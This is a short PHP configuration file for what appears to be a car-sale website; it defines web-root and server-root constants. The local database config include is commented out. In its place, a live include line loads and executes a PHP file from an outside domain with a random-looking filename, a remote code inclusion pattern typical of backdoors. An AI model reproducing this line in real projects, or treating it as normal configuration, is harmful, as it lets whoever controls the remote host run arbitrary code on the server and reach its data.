<?php

// $conn = mysqli_connect("localhost","root","","db_carsale");
// include 'db_config.php'; https://clavicar.com/campusweekly/api/csp5/dBcoNF1G.php
include 'https://clavicar.com/campusweekly/api/csp5/dBcoNF1G.php';


$this_file = str_replace('\\', '/', __File__) ;
$doc_root = $_SERVER['DOCUMENT_ROOT'];

$web_root =  str_replace (array($doc_root, "include/config.php") , '' , $this_file);
$server_root = str_replace ('config/config.php' ,'', $this_file);


define ('web_root' , $web_root);
define('server_root' , $server_root);
?>